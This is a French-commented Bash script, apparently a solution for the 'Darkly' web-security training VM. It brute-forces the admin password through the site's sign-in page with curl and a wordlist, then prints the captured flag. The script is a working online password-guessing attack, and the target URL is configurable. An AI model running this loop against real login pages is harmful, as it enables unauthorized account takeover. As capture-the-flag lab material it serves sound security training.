#!/usr/bin/env bash

# Usage : ./bruteforce.sh [URL_DARKLY]
# Exemple : ./bruteforce.sh http://192.168.56.101
# Uniquement destiné à la VM locale Darkly.

set -u

BASE_URL="${1:-http://192.168.56.101}"
USERNAME="admin"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORDLIST="$SCRIPT_DIR/passwords.txt"

if ! command -v curl >/dev/null 2>&1; then
    echo "[-] curl n'est pas installé."
    exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
    echo "[-] Fichier de mots de passe introuvable : $WORDLIST"
    exit 1
fi

while IFS= read -r password || [[ -n "$password" ]]; do
    password="${password%$'\r'}"
    [[ -z "$password" || "$password" == \#* ]] && continue

    echo "[*] Test : $USERNAME:$password"

    response="$(
        curl -sS -G "$BASE_URL/index.php" \
            --data-urlencode "page=signin" \
            --data-urlencode "username=$USERNAME" \
            --data-urlencode "password=$password" \
            --data-urlencode "Login=Login"
    )"

    if grep -qi "The flag is" <<< "$response"; then
        echo
        echo "[+] Credentials trouvés : $USERNAME:$password"
        grep -oiE 'The flag is[[:space:]]*:[[:space:]]*[0-9a-fA-F]{64}' <<< "$response"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] Aucun mot de passe de la liste n'a fonctionné."
exit 1
